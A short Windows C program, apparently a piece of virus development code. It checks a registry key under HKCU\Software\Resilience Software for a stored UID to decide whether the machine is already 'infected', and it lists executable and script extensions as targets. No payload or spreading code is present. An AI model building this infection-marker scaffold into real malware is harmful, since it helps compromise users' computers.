#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

//startup reg keys
static char SoftwareName[] = "Software\\Resilience Software";

//declaration of functions
BOOL CheckIfRegStored();


char UniqName[] = "Digit";
WCHAR wUniqName[] = L"Digit";
char extensions[] = ".exe;.bat;.reg;.vbs;";
WCHAR wUniq[37];
BYTE Uniq[37];


int main() {

	printf("%d\n", CheckIfRegStored());

}


BOOL CheckIfRegStored() {

	int Len;
	HKEY hKey;
	DWORD KeyOption;


	MessageBox(NULL,"CheckIfInfected",NULL,MB_OK);
	//first check if 'Uniq' = UID exist
	hKey = NULL;
	KeyOption = 0;

	RegCreateKeyEx(
		HKEY_CURRENT_USER,
		SoftwareName,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&KeyOption
	);
	
	if(KeyOption==REG_CREATED_NEW_KEY) {

		RegCloseKey(hKey);
		printf("KeyOption==REG_CREATED_NEW_KEY\n\n");
		return FALSE; 

	} //not infected

	KeyOption = 0;

	Len = sizeof(Uniq);

	memset(Uniq,0x00,sizeof(Uniq));

	RegQueryValueEx(
		hKey,
		UniqName,
		0,
		&KeyOption,
		Uniq,
		&Len
	);

	if(Uniq[0]==0x00) { 

		RegCloseKey(hKey); 
		printf("Uniq[0]==0x00\n\n");
		return FALSE; 

	} //not infected

	RegCloseKey(hKey);

	memset(wUniq,0x00,sizeof(wUniq));

	MultiByteToWideChar(
		CP_ACP,
		0,
		Uniq,
		lstrlen(Uniq),
		wUniq,
		sizeof(wUniq)
	);

	MessageBox(NULL,Uniq,NULL,MB_OK);

	return TRUE; //infected
}
